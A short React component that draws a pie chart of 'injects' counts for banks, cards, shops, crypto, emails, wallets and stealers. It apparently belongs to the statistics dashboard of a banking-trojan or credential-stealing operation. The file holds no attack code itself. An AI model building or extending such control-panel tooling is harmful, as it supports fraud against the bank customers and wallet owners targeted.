import React from "react";
import {Pie} from "@ant-design/charts";
import {dividerConfig} from "./GeneralStats";
import {Divider} from "antd";
import {StatsCardProps} from "../../../Model/StatsCard";

interface InjectsProps extends StatsCardProps{
    injects: any, // TODO type
}

const InjectsPie: React.FC<InjectsProps> = (props: InjectsProps) => {
    const data = [
        {
            type: "Banks",
            value: props.injects.banks,
        },
        {
            type: "Cards",
            value: props.injects.credit_cards,
        },
        {
            type: "Shops",
            value: props.injects.shops,
        },
        {
            type: "Crypt",
            value: props.injects.crypt,
        },
        {
            type: "Emails",
            value: props.injects.emails,
        },
        {
            type: "Wallets",
            value: props.injects.wallets,
        },
        {
            type: "Stealers",
            value: props.injects.stealers,
        },
    ];
    const config = {
        appendPadding: 0,
        data,
        angleField: "value",
        colorField: "type",
        radius: 1,
        startAngle: Math.PI,
        endAngle: Math.PI * 1.5,
        label: {
            type: "inner",
            offset: "50%",
            content: "{name}",
            style: {
                fontSize: 12,
            },
        },
        interactions: [
            {
                type: "element-active",
            },
        ],
        pieStyle: {
            lineWidth: 1,
        },
    };

    return (
        <div className="stat-block">
            <Divider {...dividerConfig}>
                <h2>{props.title}</h2>
            </Divider>

            <Pie {...config} />
        </div>
    );
};

export default InjectsPie;
